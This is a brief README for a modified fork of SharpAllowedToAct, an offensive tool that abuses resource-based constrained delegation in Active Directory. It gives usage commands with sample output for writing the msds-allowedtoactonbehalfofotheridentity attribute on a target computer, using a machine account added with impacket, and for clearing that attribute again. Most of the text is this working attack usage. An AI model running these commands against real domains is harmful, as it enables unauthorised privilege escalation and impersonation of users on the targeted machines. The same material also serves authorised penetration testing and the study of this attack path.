# SharpAllowedToAct

仅优化了代码逻辑和解决了一点BUG

使用 `impacket addcomputer.py` 添加机器账户后，再修改 `msds-allowedtoactonbehalfofotheridentity`

```powershell
SharpAllowedToAct.exe -m Fake -u User -p Password@1234 -t PC -a AD -d domain.local
[+] Domain = domain.local
[+] Domain Controller = AD
[+] Machine added by the attacker = Fake$
[+] Distinguished Name = CN=Fake,CN=Computers,DC=domain,DC=local
[+] Attempting LDAP login...
[+] SID of the machine added by the attacker: S-1-5-21-2178918139-4193269905-276373488-1630
[+] Attribute changed successfully
[+] Done!

SharpAllowedToAct.exe -m Fake -u User -p Password@1234 -t PC -a AD -d domain.local -c true
[+] Clearing attribute...
[+] Attribute changed successfully
[+] Done!
```

## References 📚

https://github.com/pkb1s/SharpAllowedToAct

https://github.com/Jumbo-WJB/SharpAllowedToAct-Modify